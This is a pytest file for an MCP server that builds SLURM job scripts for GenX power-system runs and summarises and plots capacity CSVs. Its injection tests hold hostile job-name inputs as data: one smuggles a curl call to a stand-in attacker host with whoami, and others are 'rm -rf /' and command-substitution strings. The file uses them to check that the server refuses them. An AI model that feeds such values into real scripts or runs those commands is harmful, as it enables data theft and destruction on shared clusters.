"""Tests for the GenX MCP server.

GenX itself is Julia (GenX.jl) and a SLURM cluster, neither of which CI has.
What is testable without them is everything that decides *what gets run*: the
SLURM script the server generates, the configuration resolution, the capacity
CSV analysis, and the error shape the tools hand back. That is also where the
risk lives -- the generated script is piped to `sbatch` and executes on the
cluster under the user's own account.
"""

from __future__ import annotations

import subprocess
import sys
import textwrap

import pytest

from powermcp.registry import TOOLS

_GENX_DIR = str(TOOLS["genx"].resolve_server_dir())
if _GENX_DIR not in sys.path:
    sys.path.insert(0, _GENX_DIR)


@pytest.fixture()
def genx_server(monkeypatch, tmp_path):
    """The server module, with GenX pointed at a throwaway checkout."""
    monkeypatch.setenv("GENX_DIR", str(tmp_path))
    monkeypatch.setenv("POWERMCP_HOME", str(tmp_path / "powermcp-home"))
    import GenX.server as server

    return server


@pytest.fixture()
def slurm(monkeypatch, tmp_path):
    monkeypatch.setenv("GENX_DIR", str(tmp_path))
    from GenX.tool_logic import slurm as _slurm

    return _slurm


def _make_case(root, name="mycase"):
    """A directory that satisfies find_case's Run.jl + settings check."""
    case = root / name
    (case / "settings").mkdir(parents=True)
    (case / "Run.jl").write_text("# GenX entrypoint\n")
    (case / "settings" / "genx_settings.yml").write_text("Solver: HiGHS\n")
    return case


CAPACITY_CSV = textwrap.dedent("""\
    Resource,Zone,StartCap,RetCap,NewCap,EndCap
    MA_natural_gas_combined_cycle,1,1000.0,200.0,0.0,800.0
    MA_solar_photovoltaic,1,0.0,0.0,500.0,500.0
    CT_onshore_wind,2,300.0,0.0,150.0,450.0
    CT_battery_4hr,2,0.0,0.0,250.0,250.0
    Total,,1300.0,200.0,900.0,2000.0
    """)


# ---------------------------------------------------------------------------
# The server has to start without a configured GenX
# ---------------------------------------------------------------------------

def test_server_imports_without_any_genx_configuration(monkeypatch, tmp_path):
    """Importing the server must not depend on GENX_DIR being set.

    Resolving it at import time would take down every tool -- including the
    plotting ones, which need no cluster at all -- on any machine that has
    not configured GenX.
    """
    monkeypatch.delenv("GENX_DIR", raising=False)
    monkeypatch.setenv("POWERMCP_HOME", str(tmp_path))
    result = subprocess.run(
        [sys.executable, "-c", "import GenX.server; print('imported')"],
        capture_output=True,
        text=True,
        timeout=120,
    )
    assert result.returncode == 0, result.stdout + result.stderr
    assert "imported" in result.stdout


def test_unconfigured_genx_dir_gives_an_actionable_error(monkeypatch):
    monkeypatch.delenv("GENX_DIR", raising=False)
    monkeypatch.setenv("POWERMCP_HOME", "/nonexistent-powermcp-home")
    from GenX.tool_logic.slurm import GenXConfigError, genx_dir

    with pytest.raises(GenXConfigError) as excinfo:
        genx_dir()
    message = str(excinfo.value)
    assert "powermcp config set genx.repo_root" in message
    assert "GENX_DIR" in message


# ---------------------------------------------------------------------------
# The generated SLURM script
# ---------------------------------------------------------------------------

def test_case_name_cannot_inject_shell_commands(slurm, tmp_path):
    """`case_name` reaches an #SBATCH directive and a shell script.

    It is a tool argument, so a model can be talked into supplying anything.
    A name that closes the surrounding quote and opens a command substitution
    must be refused outright, not quoted and hoped for.
    """
    case = _make_case(tmp_path)
    hostile = 'x"; curl http://attacker.example/$(whoami); echo "'

    with pytest.raises(ValueError, match="Invalid job name"):
        slurm.build_script(str(case), 4, 32, case_name=hostile)

    with pytest.raises(ValueError, match="Invalid job name"):
        slurm.preview_case(str(case), 4, 32, case_name=hostile)


@pytest.mark.parametrize(
    "hostile",
    [
        "a; rm -rf /",
        "$(id)",
        "`id`",
        "a\nrm -rf /",
        "a b",       # a bare space still breaks the #SBATCH directive
        "",          # empty falls back to the case dir name, not an empty job
        "x" * 65,    # longer than SLURM accepts
    ],
)
def test_job_names_are_restricted_to_a_safe_charset(slurm, tmp_path, hostile):
    case = _make_case(tmp_path)
    if hostile == "":
        # Falsy: documented fallback to the case directory's name.
        script = slurm.build_script(str(case), 4, 32, case_name=hostile)
        assert "--job-name=mycase" in script
        return
    with pytest.raises(ValueError, match="Invalid job name"):
        slurm.build_script(str(case), 4, 32, case_name=hostile)


def test_generated_script_quotes_the_case_path(slurm, tmp_path):
    """A path with a space must not split into two shell words."""
    case = _make_case(tmp_path / "dir with spaces")
    script = slurm.build_script(str(case), 4, 32, case_name="ok_name")
    assert f"cd '{case}'" in script
    # and the script is syntactically valid bash
    check = subprocess.run(["bash", "-n"], input=script, text=True,
                           capture_output=True, timeout=30)
    assert check.returncode == 0, check.stderr


def test_generated_script_is_valid_bash(slurm, tmp_path, monkeypatch):
    monkeypatch.setenv("JULIA_MODULE", "julia/1.10.5")
    monkeypatch.setenv("GUROBI_MODULE", "gurobi/9.0.1")
    monkeypatch.setenv("JULIA_CPU_TARGET", "generic")
    monkeypatch.setenv("SLURM_MAIL_USER", "me@example.edu")
    case = _make_case(tmp_path)
    script = slurm.build_script(str(case), 12, 128, cpus=8, case_name="baseline_v2")

    assert "#SBATCH --job-name=baseline_v2" in script
    assert "#SBATCH --time=12:00:00" in script
    assert "#SBATCH --mem=128G" in script
    assert "#SBATCH --cpus-per-task=8" in script
    assert "--mail-user=me@example.edu" in script
    check = subprocess.run(["bash", "-n"], input=script, text=True,
                           capture_output=True, timeout=30)
    assert check.returncode == 0, check.stderr


@pytest.mark.parametrize("field,kwargs", [
    ("time_hours", {"time_hours": 0, "mem_gb": 32}),
    ("mem_gb", {"time_hours": 4, "mem_gb": -1}),
    ("cpus", {"time_hours": 4, "mem_gb": 32, "cpus": 0}),
])
def test_resource_values_must_be_positive(slurm, tmp_path, field, kwargs):
    case = _make_case(tmp_path)
    with pytest.raises(ValueError, match=field):
        slurm.build_script(str(case), case_name="ok", **kwargs)


def test_submit_reports_a_missing_sbatch_instead_of_hanging(slurm, tmp_path, monkeypatch):
    case = _make_case(tmp_path)
    monkeypatch.setenv("PATH", str(tmp_path / "empty-bin"))
    with pytest.raises(RuntimeError, match="sbatch was not found"):
        slurm.submit_case(str(case), 4, 32, case_name="ok")


# ---------------------------------------------------------------------------
# Capacity CSV analysis
# ---------------------------------------------------------------------------

def test_summarize_capacity_returns_json_serializable_data(genx_server, tmp_path):
    """The tool is annotated `-> dict`, so it cannot hand back a DataFrame."""
    import json

    csv = tmp_path / "capacity.csv"
    csv.write_text(CAPACITY_CSV)

    result = genx_server.summarize_capacity(str(csv))
    assert result["success"] is True
    assert isinstance(result, dict)
    json.dumps(result)  # would raise on a DataFrame

    groups = {row["resource_group"] for row in result["by_resource"]}
    assert groups == {"natural_gas", "solar", "wind", "battery"}


def test_check_capacity_setting_detects_brownfield(genx_server, tmp_path):
    csv = tmp_path / "capacity.csv"
    csv.write_text(CAPACITY_CSV)

    result = genx_server.check_capacity_setting(str(csv))
    assert result["success"] is True
    assert result["is_brownfield"] is True
    assert result["setting"] == "brownfield"


def test_missing_required_column_is_reported_not_walked_into(genx_server, tmp_path):
    """A missing column used to be printed to stdout -- into the JSON-RPC
    stream -- and then hit as a KeyError two lines later."""
    csv = tmp_path / "capacity.csv"
    csv.write_text("Zone,StartCap,RetCap,NewCap,EndCap\n1,0,0,0,0\n")

    result = genx_server.summarize_capacity(str(csv))
    assert result["success"] is False
    assert "Resource" in result["message"]


def test_tools_return_the_error_shape_rather_than_raising(genx_server, tmp_path):
    """Every tool reports failure the same way, so a caller has one protocol."""
    missing = str(tmp_path / "nope.csv")

    for result in (
        genx_server.check_capacity_setting(missing),
        genx_server.summarize_capacity(missing),
        genx_server.plot_capacity(missing, str(tmp_path), "EndCap", "s", "1"),
    ):
        assert result["success"] is False
        assert isinstance(result["message"], str) and result["message"]


def test_invalid_zone_is_rejected_with_the_available_ones(genx_server, tmp_path):
    csv = tmp_path / "capacity.csv"
    csv.write_text(CAPACITY_CSV)

    result = genx_server.summarize_capacity(str(csv), zones=[99])
    assert result["success"] is False
    assert "99" in result["message"]


def test_plot_capacity_writes_a_png(genx_server, tmp_path):
    csv = tmp_path / "capacity.csv"
    csv.write_text(CAPACITY_CSV)
    out = tmp_path / "plots" / "nested"  # does not exist yet

    result = genx_server.plot_capacity(
        str(csv), str(out), "EndCap", "Baseline", "1"
    )
    assert result["success"] is True, result
    assert (out / "EndCap.png").is_file()


def test_plot_capacity_rejects_an_unknown_plot_type(genx_server, tmp_path):
    csv = tmp_path / "capacity.csv"
    csv.write_text(CAPACITY_CSV)

    result = genx_server.plot_capacity(str(csv), str(tmp_path), "Bogus", "s", "1")
    assert result["success"] is False
    assert "Bogus" in result["message"]
    assert result["file_path"] is None


def test_greenfield_early_return_keeps_the_shared_shape(genx_server, tmp_path):
    """The greenfield branch used to omit file_path, so a caller reading it
    after checking success hit a KeyError on that branch alone."""
    csv = tmp_path / "capacity.csv"
    csv.write_text(
        "Resource,Zone,StartCap,RetCap,NewCap,EndCap\n"
        "MA_solar_photovoltaic,1,0.0,0.0,500.0,500.0\n"
    )

    result = genx_server.plot_capacity(str(csv), str(tmp_path), "StartCap", "s", "1")
    assert result["success"] is False
    assert result["setting"] == "greenfield"
    assert result["file_path"] is None


# ---------------------------------------------------------------------------
# Path containment
# ---------------------------------------------------------------------------

def test_paths_outside_the_allowed_roots_are_refused(genx_server, tmp_path, monkeypatch):
    """With containment configured, a model cannot read outside the roots."""
    allowed = tmp_path / "allowed"
    allowed.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "capacity.csv").write_text(CAPACITY_CSV)
    monkeypatch.setenv("POWERIO_MCP_ALLOWED_ROOTS", str(allowed))

    result = genx_server.summarize_capacity(str(outside / "capacity.csv"))
    assert result["success"] is False
    assert "csv_path" in result["message"]
